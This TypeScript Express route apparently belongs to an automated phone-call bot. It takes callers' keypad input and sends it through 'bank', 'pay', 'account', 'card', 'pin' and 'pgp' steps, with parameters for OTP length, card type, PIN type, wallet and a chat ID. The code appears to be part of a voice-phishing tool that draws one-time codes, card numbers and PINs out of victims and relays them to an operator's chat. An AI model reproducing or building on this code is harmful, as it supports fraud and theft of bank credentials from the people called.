import { app } from '..';
import { Language } from '../../types';
import { customDtmfFlow } from '../../utils/customDtmfFlow';
import {
  bankFlow,
  payFlow,
  accountFlow,
  cardFlow,
  pinFlow,
  pgpFlow,
} from '../../utils/dtmfFlow';

app.all('/calls/dtmf/:language/:step/:chatId', (req, res) => {
  const { step, language, chatId } = req.params;
  const {
    wallet,
    askCardInfo,
    cardType,
    pinType,
    transferNumber,
    institutionName,
    from,
    actions,
    customMessage,
    otpLength,
    variables,
    destination,
  } = req.query;

  const { dtmf } = JSON.parse(variables as string);

  switch (step) {
    case 'bank':
      bankFlow(
        String(dtmf),
        res,
        language as Language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
      );

      break;
    case 'pay':
      payFlow(
        String(dtmf),
        res,
        language as Language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
        wallet as string,
      );
      break;
    case 'account':
      accountFlow(
        String(dtmf),
        res,
        language as Language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
        askCardInfo as string,
      );
      break;
    case 'card':
      cardFlow(
        String(dtmf),
        res,
        language as Language,
        Number(chatId),
        step,
        destination as string,
        cardType as string,
      );
      break;
    case 'pin':
      pinFlow(
        String(dtmf),
        res,
        language as Language,
        Number(chatId),
        step,
        destination as string,
        pinType as string,
      );
      break;
    case 'pgp':
      pgpFlow(
        dtmf,
        res,
        language as Language,
        Number(chatId),
        step,
        String(destination),
        String(transferNumber),
        String(institutionName),
        String(from),
      );
      break;
    case 'custom':
      customDtmfFlow(
        dtmf,
        res,
        language as Language,
        Number(chatId),
        step,
        String(destination),
        String(actions),
        String(customMessage),
      );
      break;
    default:
      break;
  }
});
